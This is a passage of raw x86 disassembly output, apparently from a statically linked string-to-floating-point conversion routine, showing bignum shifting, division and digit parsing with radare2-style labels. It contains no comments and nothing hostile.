cmp edx, esi
jl 0x80897cf
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_1b8h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_1b4h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_160h]
add eax, esi
test edx, edx
mov dword [var_160h], eax
jne 0x80887e8
dec eax
mov dword [var_160h], eax
mov eax, dword [var_1b4h]
mov esi, dword [var_1b8h]
mov ebx, dword [var_15ch]
mov dword [var_1b4h], esi
mov dword [var_1b8h], eax
add edi, edi
add dword [var_1bch], 0x10
test ebx, ebx
jne 0x8088776
lea eax, [var_14ch]
cmp dword [var_1b4h], eax
je 0x80897b3
mov edx, dword [var_160h]
bsr ecx, dword [ebp + edx*4 - 0xb0]
xor ecx, 0x1f
mov eax, edx
mov dword [var_1c0h], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x400
mov dword [var_170h], eax
jle 0x8088864
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x80883df
cmp dword [var_170h], 0x35
jle 0x80889d9
mov edx, dword [var_170h]
mov eax, dword [var_170h]
mov dword [var_1c8h], 0x1f
sub edx, 0x16
sub eax, 0x35
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_1c8h]
mov dword [var_1c4h], ecx
mov dword [var_1c8h], eax
jne 0x8088958
mov eax, dword [ebp + esi*4 - 0xac]
mov dword [var_158h], eax
mov eax, dword [ebp + esi*4 - 0xa8]
mov dword [var_154h], eax
mov eax, dword [var_ach]
xor ebx, ebx
test eax, eax
jne 0x80888f4
inc ebx
mov eax, dword [ebp + ebx*4 - 0xac]
test eax, eax
je 0x80888e8
xor eax, eax
mov esi, dword [var_180h]
cmp dword [var_184h], esi
jl 0x808890c
cmp ebx, dword [var_1c4h]
jge 0x8088911
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1c4h]
mov ecx, dword [var_164h]
mov eax, dword [var_1c8h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0xac]
mov dword [var_ch], eax
mov eax, dword [var_170h]
dec eax
lea esi, [var_158h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08087c40
jmp 0x80882b6
mov eax, dword [var_1c0h]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x80889be
mov dword [var_1cch], eax
mov dword [var_1d0h], 0x20
lea eax, [var_158h]
sub dword [var_1d0h], edi
mov dword [var_218h], eax
mov edx, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0xa8]
inc ebx
shr edx, cl
movzx ecx, byte [var_1d0h]
shl eax, cl
or edx, eax
mov eax, dword [var_218h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_1cch]
mov dword [var_218h], eax
jl 0x8088987
mov eax, ebx
sub eax, esi
dec eax
jg 0x80888dc
mov eax, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
shr eax, cl
jmp 0x80888d6
mov eax, dword [var_184h]
cmp dword [var_180h], eax
je 0x8089640
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
lea edi, [var_158h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_160h]
cmp eax, 1
jle 0x8089630
mov esi, 0x37
lea edx, [var_14ch]
lea ecx, [var_ach]
sub esi, dword [var_170h]
mov dword [var_1e0h], edx
mov dword [var_1e4h], ecx
mov edx, 0x55555556
mov ecx, dword [var_180h]
mov dword [var_1e8h], 0x80a7020
sub ecx, dword [var_184h]
mov dword [var_1dch], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x8088a89
mov ecx, dword [var_184h]
mov dword [var_1dch], 1
lea edx, [edx + ecx + 2]
mov dword [var_180h], edx
mov esi, dword [var_180h]
mov dword [var_16ch], 0
sub esi, dword [var_184h]
sub esi, ebx
mov ebx, 1
mov dword [var_1d8h], esi
test dword [var_1d8h], ebx
je 0x8088af4
mov eax, dword [var_16ch]
xor dword [var_1d8h], ebx
test eax, eax
jne 0x80895b4
mov eax, dword [var_1e8h]
mov edi, dword [var_1e0h]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_16ch], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_1d8h]
add ebx, ebx
add dword [var_1e8h], 0x10
test eax, eax
jne 0x8088aac
lea eax, [var_ach]
cmp dword [var_1e0h], eax
je 0x8089598
mov edx, dword [var_190h]
mov esi, dword [var_18ch]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_160h]
mov esi, dword [var_184h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_180h], esi
mov edx, dword [var_174h]
lea ecx, [var_ach]
mov eax, dword [var_180h]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08087f00
mov ecx, dword [var_16ch]
bsr eax, dword [ebp + ecx*4 - 0x150]
mov ebx, eax
xor ebx, 0x1f
jle 0x8088be2
lea esi, [var_14ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_160h]
lea edx, [var_ach]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x8088be2
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], edx
inc eax
mov dword [var_160h], eax
cmp dword [var_16ch], 1
mov esi, dword [var_170h]
mov dword [var_15ch], esi
je 0x8089440
cmp dword [var_16ch], 2
je 0x8089139
mov eax, dword [var_16ch]
mov ecx, dword [var_16ch]
mov dword [var_200h], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x154]
mov esi, dword [ebp + eax*4 - 0x150]
mov eax, dword [var_160h]
mov dword [var_1fch], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x14c]
mov dword [var_4h], eax
lea eax, [var_ach]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x8088c75
mov eax, dword [var_160h]
mov dword [ebp + eax*4 - 0xac], 0
inc eax
mov dword [var_160h], eax
mov eax, dword [var_160h]
cmp eax, dword [var_16ch]
jge 0x8089117
mov edx, dword [var_16ch]
sub edx, eax
mov dword [var_204h], edx
mov edx, dword [var_170h]
test edx, edx
jle 0x80890c0
mov eax, dword [var_204h]
shl eax, 5
add eax, dword [var_170h]
cmp eax, 0x35
jg 0x8088ff7
mov ecx, dword [var_160h]
mov eax, dword [var_158h]
mov dword [var_158h], 0
test ecx, ecx
mov dword [var_154h], eax
jle 0x8088cf7
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x8088cdb
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8088d14
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x8088d04
shl dword [var_204h], 5
mov edx, dword [var_204h]
add dword [var_170h], edx
mov eax, dword [var_16ch]
cmp dword [var_170h], 0x35
mov dword [ebp + eax*4 - 0x14c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0xac]
mov ebx, eax
jg 0x8088ebf
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_210h], ecx
mov dword [var_20ch], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x8088dc0
mov edx, dword [var_16ch]
mov eax, dword [ebp + edx*4 - 0xb0]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_1fch]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x8088fd9
add ecx, esi
dec edi
cmp ecx, esi
jb 0x8088dc0
cmp ebx, dword [var_1fch]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_1fch]
cmp edx, ecx
ja 0x8088d92
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
mov edx, dword [var_210h]
lea ecx, [var_14ch]
lea eax, [var_ach]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_16ch]
cmp dword [ebp + edx*4 - 0xac], eax
je 0x8088e16
lea eax, [var_ach]
lea ecx, [var_14ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_16ch]
mov edx, dword [var_20ch]
mov eax, dword [ebp + ecx*4 - 0xb0]
test edx, edx
mov dword [ebp + ecx*4 - 0xac], eax
mov ebx, eax
jle 0x8088e49
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8088e36
mov eax, dword [var_170h]
test eax, eax
jne 0x8088f4c
test edi, edi
mov edx, 0x20
je 0x8088e66
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8088f2c
add edx, 0x35
mov eax, edi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_200h], edx
shr eax, cl
mov dword [var_158h], eax
mov ecx, dword [var_214h]
cmp ecx, 0x35
mov dword [var_170h], ecx
jle 0x8088d62
mov esi, dword [var_16ch]
mov eax, dword [ebp + esi*4 - 0xac]
test eax, eax
mov edx, dword [var_16ch]
jne 0x8088edd
test edx, edx
js 0x8088edd
dec edx
mov ebx, dword [ebp + edx*4 - 0xac]
test ebx, ebx
jne 0x8088edd
test edx, edx
jns 0x8088ecd
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8088eed
test edx, edx
js 0x8088ef2
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_158h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_200h]
mov dword [var_10h], eax
mov eax, dword [var_164h]
mov dword [var_8h], eax
mov eax, dword [var_15ch]
dec eax
mov dword [var_4h], eax
jmp 0x808894e
neg edx
mov dword [var_154h], 0
mov dword [var_158h], edi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x8088e9d
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x8088f77
mov eax, dword [var_158h]
mov dword [var_158h], edi
mov dword [var_154h], eax
jmp 0x8088e9d
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
mov eax, dword [var_200h]
test eax, eax
jle 0x8088e9d
mov ecx, dword [var_200h]
lea eax, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_200h]
shr eax, cl
or dword [var_158h], eax
jmp 0x8088e9d
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
jmp 0x8088dc0
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
cmp dword [var_200h], 0x1f
jle 0x8089083
mov ebx, dword [var_200h]
mov ecx, dword [var_200h]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_200h], 0xffffffff
cmovg ebx, dword [var_200h]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_158h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x8088d14
lea edx, [ebp + eax*4 - 0x158]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x8089072
jmp 0x8088d14
mov eax, dword [var_200h]
test eax, eax
jle 0x8088d14
mov edx, dword [var_200h]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x8088d14
lea esi, [esi]
test eax, eax
mov ecx, eax
jle 0x80890e2
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x80890c6
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x80890ff
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x80890ef
shl dword [var_204h], 5
mov edx, dword [var_204h]
sub dword [var_15ch], edx
jmp 0x8088d27
test eax, eax
mov edx, eax
jle 0x8088d27
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8089121
jmp 0x8088d27
cmp dword [var_160h], 1
mov eax, dword [var_148h]
mov dword [var_1f4h], 0
mov dword [var_1f8h], 0
mov edi, dword [var_14ch]
mov dword [var_1f0h], eax
jle 0x8089389
mov esi, dword [var_a8h]
mov ebx, dword [var_ach]
cmp dword [var_170h], 0x35
jg 0x808924d
cmp esi, dword [var_1f0h]
je 0x8089355
mov eax, ebx
mov edx, esi
div dword [var_1f0h]
mov ecx, edx
mov dword [var_1f4h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x80891b3
jne 0x80891cc
test ebx, ebx
je 0x80891cc
add ecx, dword [var_1f0h]
dec dword [var_1f4h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_1f0h]
jae 0x80891a9
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_170h]
test eax, eax
jne 0x80892be
mov eax, dword [var_1f4h]
mov edx, 0x20
test eax, eax
je 0x80891fd
bsr edx, dword [var_1f4h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8089298
mov eax, dword [ebp - 0x1f4]
add edx, 0x35
mov dword [ebp - 0x214], 0x56
sub ecx, edx
mov dword [ebp - 0x1f8], edx
shr eax, cl
mov dword [ebp - 0x158], eax
mov eax, dword [ebp - 0x214]
cmp eax, 0x35
mov dword [ebp - 0x170], eax
jle 0x8089185
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8089261
test esi, esi
jne 0x8089261
test ebx, ebx
je 0x8089266
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1f4h]
mov eax, 0x1f
sub eax, dword [var_1f8h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_8h], ecx
jmp 0x8088940
mov ecx, dword [ebp - 0x1f4]
neg edx
mov dword [ebp - 0x154], 0
add edx, 0x20
mov dword [ebp - 0x214], edx
mov dword [ebp - 0x158], ecx
jmp 0x8089238
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x80892ef
mov eax, dword [var_158h]
mov edx, dword [var_1f4h]
mov dword [var_154h], eax
mov dword [var_158h], edx
jmp 0x8089238
mov dword [var_1f8h], 0x35
mov ecx, dword [var_170h]
sub dword [var_1f8h], ecx
mov eax, dword [var_1f8h]
test eax, eax
jle 0x8089238
mov eax, dword [ebp - 0x1f8]
lea edx, [ebp - 0x158]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1f4]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1f8]
shr eax, cl
or dword [ebp - 0x158], eax
jmp 0x8089238
lea ecx, [esi + ebx]
mov dword [var_1f4h], 0xffffffff
cmp ecx, esi
jb 0x8089379
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x80891a9
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x80891d6
mov eax, dword [var_ach]
cmp eax, dword [var_1f0h]
jb 0x80893a0
xor esi, esi
mov ebx, eax
jmp 0x8089178
mov ecx, dword [var_170h]
test ecx, ecx
jle 0x8089429
mov ebx, dword [var_170h]
add ebx, 0x20
cmp ebx, 0x35
jg 0x80893e3
mov eax, dword [var_158h]
mov dword [var_158h], 0
mov dword [var_154h], eax
mov eax, dword [var_ach]
mov dword [var_170h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x8089178
mov dword [var_1f8h], 0x35
mov edx, dword [var_170h]
sub dword [var_1f8h], edx
mov edx, dword [var_1f8h]
test edx, edx
jle 0x80893d4
mov ecx, dword [var_1f8h]
lea esi, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x80893ce
mov ebx, dword [var_170h]
sub ebx, 0x20
mov dword [var_15ch], ebx
jmp 0x80893da
lea esi, [esi]
mov dword [var_1ech], 0
mov ebx, dword [var_ach]
mov edi, dword [var_14ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_170h]
test eax, eax
jne 0x808950b
test esi, esi
mov edx, 0x20
je 0x808947d
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x80894ee
add edx, 0x35
mov eax, esi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_1ech], edx
shr eax, cl
mov dword [var_158h], eax
mov edx, dword [var_214h]
cmp edx, 0x35
mov dword [var_170h], edx
jle 0x8089456
mov edi, dword [var_1dch]
xor eax, eax
test edi, edi
jne 0x80894d1
test ebx, ebx
je 0x80894d6
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_1ech]
jmp 0x808927f
neg edx
mov dword [var_154h], 0
mov dword [var_158h], esi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x80894b0
mov ecx, dword [var_170h]
add ecx, 0x20
cmp ecx, 0x35
mov dword [var_214h], ecx
jg 0x8089536
mov eax, dword [var_158h]
mov dword [var_158h], esi
mov dword [var_154h], eax
jmp 0x80894b0
mov dword [var_1ech], 0x35
mov eax, dword [var_170h]
sub dword [var_1ech], eax
mov eax, dword [var_1ech]
test eax, eax
jle 0x80894b0
mov edx, dword [var_1ech]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_1ech]
shr eax, cl
or dword [var_158h], eax
jmp 0x80894b0
mov ecx, dword [var_16ch]
lea edi, [var_14ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088b19
mov edx, dword [var_1e8h]
mov ecx, dword [var_16ch]
mov esi, dword [var_1e0h]
mov dword [var_10h], ecx
mov ecx, dword [var_1e4h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_1e0h]
mov esi, dword [var_1e8h]
mov edx, dword [var_16ch]
add edx, dword [esi + 4]
mov esi, dword [var_1e4h]
mov dword [var_1e4h], edi
mov dword [var_1e0h], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_16ch], edx
jmp 0x8088af4
mov dword [ebp + eax*4 - 0x158], 0
jmp 0x8088a15
mov eax, dword [var_170h]
mov edx, dword [var_170h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_1d4h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x14
je 0x8089765
cmp edx, 0x13
jg 0x80896ff
mov ecx, dword [var_1c0h]
mov eax, 0x14
mov ebx, 2
sub eax, edx
lea esi, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80896b9
mov ecx, dword [var_164h]
mov esi, dword [var_1d4h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_158h]
mov dword [esp], eax
jmp 0x808894e
lea eax, [edx - 0x14]
lea edi, [var_158h]
lea edx, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_1c0h]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_1c0h]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_160h]
test edx, edx
mov dword [ebp + edx*4 - 0x158], eax
jle 0x80896c5
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x8089754
jmp 0x80896c5
mov eax, 2
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
mov edi, eax
sub edi, dword [var_1c0h]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x158]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80897a2
jmp 0x80896c5
mov ecx, dword [var_160h]
lea edi, [var_ach]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088829
mov dword [var_10h], edx
mov ecx, dword [var_1b4h]
mov dword [var_8h], esi
mov edx, dword [var_1bch]
mov dword [var_ch], ecx
mov ecx, dword [var_1b8h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x80887c4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8088385
mov ecx, dword [var_184h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x80886aa
mov eax, ecx
jmp 0x80886aa
mov eax, dword [var_174h]
mov ecx, dword [arg_14h]
mov dword [var_1b0h], 1
mov esi, 0x14
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089868
inc dword [var_174h]
mov eax, dword [var_174h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808984f
cmp dl, 0x30
je 0x8089a26
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8089a0f
inc dword [var_174h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6160]
dec dword [var_180h]
mov dword [var_170h], eax
mov eax, esi
sub eax, dword [var_170h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_170h]
mov dword [var_154h], edx
mov edx, dword [var_184h]
lea eax, [ecx + edx*4]
add eax, dword [var_15ch]
lea ebx, [eax - 5]
mov eax, dword [var_180h]
mov dword [var_15ch], ebx
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
lea ebx, [ebp + eax*4 - 0x158]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089909
mov eax, dword [var_198h]
add ecx, eax
mov dword [var_174h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x80899f8
inc dword [var_174h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808999f
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_180h]
mov eax, dword [var_180h]
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
test eax, eax
jns 0x80898e5
mov ebx, dword [var_1b0h]
test ebx, ebx
jle 0x808996e
lea edx, [var_158h]
mov eax, dword [var_1b0h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8089962
mov esi, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x80896f1
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_1b0h]
js 0x80899c7
mov dword [ebx], edx
add esi, 0x1c
jmp 0x8089932
xor eax, eax
mov ecx, dword [var_164h]
mov dword [var_10h], 0x1f
cmp dword [var_180h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_15ch]
jmp 0x8088941
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089920
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089888
inc dword [var_174h]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x8089a26
jmp 0x8089871
mov eax, dword [var_188h]
mov edx, dword [var_15ch]
shl eax, 2
sub edx, eax
jmp 0x808866a
test al, al
jne 0x8088602
jmp 0x808863f
mov ecx, dword [var_18ch]
movzx eax, byte [ecx + 1]
jmp 0x8089a55
mov edx, dword [arg_ch]
test edx, edx
jne 0x8088380
jmp 0x8088385
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x8088385
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x8088385
mov eax, dword [var_18ch]
movzx eax, byte [eax]
mov byte [var_206h], al
mov edx, dword [var_180h]
xor eax, eax
test edx, edx
mov dword [var_184h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_206h], 0
mov dword [var_188h], eax
je 0x8089e22
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8089aeb
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089ad7
test al, al
jne 0x8089e1b
add edi, dword [var_198h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089ddd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x8089b34
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp dword [var_188h], 0xffffffff
cmovne eax, dword [var_188h]
mov dword [var_188h], eax
inc dword [var_180h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089b0d
cmp dword [var_168h], 0x10
mov edx, esi
movsx eax, dl
jne 0x8089b60
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
cmp dword [var_168h], 0x10
mov dword [var_17ch], edi
je 0x8089dd4
cmp dword [ecx + eax*4], 0x65
je 0x8089c61
mov esi, dword [var_184h]
cmp dword [var_180h], esi
jle 0x8089b9b
mov eax, dword [var_17ch]
cmp byte [eax - 1], 0x30
je 0x8089c44
mov ecx, dword [var_184h]
cmp dword [var_180h], ecx
jne 0x808859b
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x808859b
mov ebx, dword [var_15ch]
test ebx, ebx
jns 0x808859b
cmp dword [var_168h], 0x10
je 0x8089c28
mov eax, dword [var_17ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x8089c20
cmp cl, 0x30
jne 0x808859b
dec dword [var_180h]
inc ebx
dec dword [var_17ch]
mov ecx, dword [var_180h]
dec dword [var_184h]
mov dword [var_15ch], ebx
test ecx, ecx
jle 0x808859b
test ebx, ebx
js 0x8089bc9
jmp 0x808859b
dec dword [var_17ch]
jmp 0x8089bc9
mov esi, dword [var_17ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x8089be7
jmp 0x8089c20
dec dword [var_17ch]
dec dword [var_180h]
mov edx, dword [var_17ch]
cmp byte [edx - 1], 0x30
je 0x8089c44
jmp 0x8089b9b
inc edi
mov dword [var_1ach], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x8089dc8
cmp al, 0x2b
je 0x8089dbf
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089db4
cmp dword [var_168h], 0x10
je 0x8089d81
mov eax, dword [var_1ach]
test eax, eax
je 0x8089d6a
mov edx, dword [var_184h]
add edx, 0x168
mov eax, dword [var_15ch]
lea eax, [eax + eax*4]
